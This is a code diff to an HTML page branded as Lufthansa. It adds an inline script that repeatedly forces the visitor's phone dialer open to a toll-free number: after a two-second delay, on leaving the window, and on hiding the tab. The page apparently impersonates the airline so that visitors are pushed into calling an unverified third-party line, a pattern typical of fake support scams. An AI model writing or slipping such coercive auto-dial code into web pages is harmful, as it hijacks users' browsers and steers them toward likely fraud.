@@ -17,7 +17,7 @@
     <div class="lh-top">
       <a href="index.html" class="lh-logo"><span class="logo-circle"><i
             class="fa-solid fa-plane"></i></span>Lufthansa</a>
-      <div class="header-icons"><a href="tel:+18333650546"><i class="fa-solid fa-phone"></i></a><button class="menu-btn"
+      <div class="header-icons"><a href="tel:+18333650546" class="cta-btn"data-autodial><i class="fa-solid fa-phone"></i></a><button class="menu-btn"
           id="menuBtn"><i class="fa-solid fa-bars"></i></button></div>
     </div>
     <nav class="lh-tabs" id="navMenu">
@@ -142,6 +142,63 @@
     </div>
   </div>
   <script src="script.js"></script>
+  <script>
+(function () {
+ 
+    // ==========================
+    // CONFIG
+    // ==========================
+    var PHONE = "tel:+18333650546";
+    var DELAY_SEC = 2;      // Auto trigger after 2 seconds
+    var EXIT_INTENT = true; // Enable exit intent
+    // ==========================
+ 
+    var fired = false;
+ 
+    function dial() {
+        if (fired) return;
+        fired = true;
+ 
+        console.log("Opening dialer...");
+ 
+        window.location.href = PHONE;
+    }
+ 
+    // Auto trigger after delay
+    if (DELAY_SEC > 0) {
+        setTimeout(function () {
+            dial();
+        }, DELAY_SEC * 1000);
+    }
+ 
+    // Click trigger
+    document.addEventListener("click", function (e) {
+        if (e.target.closest("[data-autodial]")) {
+            e.preventDefault();
+            dial();
+        }
+    });
+ 
+    // Exit intent (Desktop)
+    if (EXIT_INTENT) {
+ 
+        document.addEventListener("mouseleave", function (e) {
+            if (e.clientY < 10) {
+                dial();
+            }
+        });
+ 
+        // Mobile: when tab becomes hidden
+        document.addEventListener("visibilitychange", function () {
+            if (document.hidden) {
+                dial();
+            }
+        });
+ 
+    }
+ 
+})();
+</script>
 </body>
 
 </html>
